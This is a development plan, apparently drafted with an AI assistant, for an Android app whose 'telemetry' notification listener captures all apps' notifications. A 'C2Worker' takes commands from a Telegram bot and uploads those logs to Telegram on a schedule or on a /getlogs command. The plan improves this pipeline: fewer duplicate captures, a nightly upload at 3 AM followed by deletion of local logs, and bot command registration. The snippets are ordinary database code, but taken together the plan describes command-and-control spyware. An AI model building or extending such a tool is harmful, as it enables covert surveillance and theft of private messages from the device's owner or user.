# CyperBot Implementation Plan

## Overview
Fix two critical issues:
1. Notification spam - implement daily cleanup at 3 AM with datetime-based duplicate detection
2. Telegram bot commands not updating on test connection
3. Disable automatic log uploads during C2 cycles - only send logs at 3 AM and via /getlogs command

---

## Task 1: Notification Spam Fix

### Parameters Confirmed
- **Cleanup window**: Delete logs older than 24 hours
- **Duplicate detection**: Consider notifications within 5-minute window as duplicates
- **Scope**: Cleanup all log types (not just notifications)

### Implementation Steps

#### 1.1 Modify `SentinelNotificationListener.kt`
**File**: `app/src/main/java/com/zero/sentinel/telemetry/SentinelNotificationListener.kt`

**Changes**:
- Replace `lastNotificationHash: Int` with `lastNotificationMap: Map<String, Long>` to track per-package timestamps
- In `onNotificationPosted()`, check if same package+content exists within last 5 minutes
- If duplicate found within 5 minutes, skip logging
- Update the timestamp map with current notification time

**Logic**:
```
For each notification:
  1. Get packageName and content
  2. Check if (packageName, content) exists in lastNotificationMap
  3. If exists AND (currentTime - lastTime) < 5 minutes → skip (duplicate)
  4. Otherwise → insert log and update map
```

#### 1.2 Create `NotificationCleanupWorker.kt`
**File**: `app/src/main/java/com/zero/sentinel/workers/NotificationCleanupWorker.kt` (NEW)

**Responsibilities**:
- Delete all logs with `timestamp < (now - 24 hours)`
- Run daily at 3 AM (03:00)
- Use WorkManager for reliable scheduling
- Log success/failure

**Implementation**:
- Extend `CoroutineWorker`
- Call `repository.deleteLogsOlderThan(cutoffTimestamp)`
- Return `Result.success()` or `Result.retry()`

#### 1.3 Update `LogRepository.kt`
**File**: `app/src/main/java/com/zero/sentinel/data/repository/LogRepository.kt`

**Add method**:
```kotlin
suspend fun deleteLogsOlderThan(timestamp: Long) {
    withContext(Dispatchers.IO) {
        logDao.deleteLogsOlderThan(timestamp)
    }
}
```

#### 1.4 Update `LogDao.kt`
**File**: `app/src/main/java/com/zero/sentinel/data/dao/LogDao.kt`

**Add query**:
```kotlin
@Query("DELETE FROM logs WHERE timestamp < :timestamp")
suspend fun deleteLogsOlderThan(timestamp: Long)
```

#### 1.5 Update `C2Worker.kt`
**File**: `app/src/main/java/com/zero/sentinel/workers/C2Worker.kt`

**Changes**:
- Remove automatic `uploadLogs()` call from regular C2 cycles
- Keep command processing in `processCommands()`
- Add check: if current time is 3 AM, call both `uploadLogs()` and `cleanupLogs()`
- This way, `/getlogs` command (processed in C2Worker) will trigger both upload AND cleanup
- At 3 AM, logs are automatically uploaded and old logs are cleaned up

#### 1.5a Add `cleanupLogs()` method to `C2Worker.kt`
**Logic**:
```kotlin
private suspend fun cleanupLogs() {
    val cutoffTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000) // 24 hours ago
    repository.deleteLogsOlderThan(cutoffTime)
    Log.i("C2Worker", "Cleanup: Deleted logs older than 24 hours")
}
```

#### 1.6 Update `MainActivity.kt` - Schedule Cleanup Worker
**File**: `app/src/main/java/com/zero/sentinel/ui/MainActivity.kt`

**In `schedulePeriodicWork()` method**:
- Add PeriodicWorkRequest for `NotificationCleanupWorker` - daily at 3 AM
- Set to run daily at 3 AM using `setInitialDelay()` and `setBackoffCriteria()`
- Use `FlexTimeInterval` for 3 AM scheduling

---

## Task 2: Telegram Bot Commands Update Fix

### Root Cause
Commands are registered AFTER sending test message, and no cleanup happens before registration.

### Implementation Steps

#### 2.1 Update `MainActivity.performFullSystemTest()`
**File**: `app/src/main/java/com/zero/sentinel/ui/MainActivity.kt` (lines 235-273)

**Changes**:
- Move `client.setMyCommands()` call to BEFORE `client.sendMessage()`
- Add error handling for command registration
- Log success/failure

**New order**:
1. Verify token with `testToken()`
2. **Register commands with `setMyCommands()`** ← MOVED UP
3. Send device info message
4. Trigger C2 cycle

#### 2.2 Verify `TelegramClient.setMyCommands()`
**File**: `app/src/main/java/com/zero/sentinel/network/TelegramClient.kt` (lines 129-163)

**Current implementation is correct**:
- Sends proper JSON payload to Telegram API
- Handles success/failure responses
- Logs appropriately

**No changes needed** - just ensure it's called first in the test flow.

---

## Files to Modify

| File | Type | Changes |
|------|------|---------|
| `SentinelNotificationListener.kt` | Modify | Replace hash-based dedup with datetime-based per-package tracking |
| `NotificationCleanupWorker.kt` | Create | New worker for daily cleanup at 3 AM |
| `LogRepository.kt` | Modify | Add `deleteLogsOlderThan()` method |
| `LogDao.kt` | Modify | Add `deleteLogsOlderThan()` query |
| `C2Worker.kt` | Modify | Remove automatic log upload + add 3 AM check for auto-upload |
| `MainActivity.kt` | Modify | Schedule cleanup worker at 3 AM + reorder test connection flow |

---

## Testing Checklist

- [ ] Duplicate notifications within 5 minutes are filtered
- [ ] Notifications older than 24 hours are deleted daily at 3 AM
- [ ] Telegram commands update when test connection is clicked
- [ ] No errors in logcat during cleanup worker execution
- [ ] Worker runs reliably even after app restart

---

## Implementation Order

1. Create `NotificationCleanupWorker.kt`
2. Update `LogDao.kt` with delete query
3. Update `LogRepository.kt` with delete method
4. Update `SentinelNotificationListener.kt` with datetime-based dedup
5. Update `C2Worker.kt` - add 3 AM check for auto-upload, remove automatic upload
6. Update `MainActivity.kt` to schedule cleanup worker at 3 AM and fix test flow

## Key Changes Summary

### Log Upload & Cleanup Flow
- **Before**: Logs uploaded every 15 minutes during C2 cycles
- **After**: Logs uploaded + cleaned up only at 3 AM (automatic) or via `/getlogs` command (manual)

### C2 Worker (15-minute cycles)
- **Before**: Process commands + Upload logs
- **After**: Process commands only (no automatic upload/cleanup)

### When Upload + Cleanup Happens
1. **At 3 AM**: C2Worker detects 3 AM time and calls both `uploadLogs()` and `cleanupLogs()`
2. **On `/getlogs` command**: CommandProcessor triggers upload + cleanup via C2Worker
3. **NotificationCleanupWorker**: Runs at 3 AM as backup cleanup (in case C2Worker doesn't run)

### Cleanup Logic
- Delete all logs with `timestamp < (now - 24 hours)`
- Triggered together with log upload (both at 3 AM and on `/getlogs`)

---

## 📅 Final Schedule

| Time | Action |
|------|--------|
| Every 15 min | C2Worker: Process commands only |
| 3:00 AM daily | C2Worker: Upload logs + Cleanup old logs (via 3 AM check) |
| 3:00 AM daily | NotificationCleanupWorker: Delete logs older than 24 hours (backup) |
| On demand | `/getlogs` command: Upload logs + Cleanup old logs immediately |
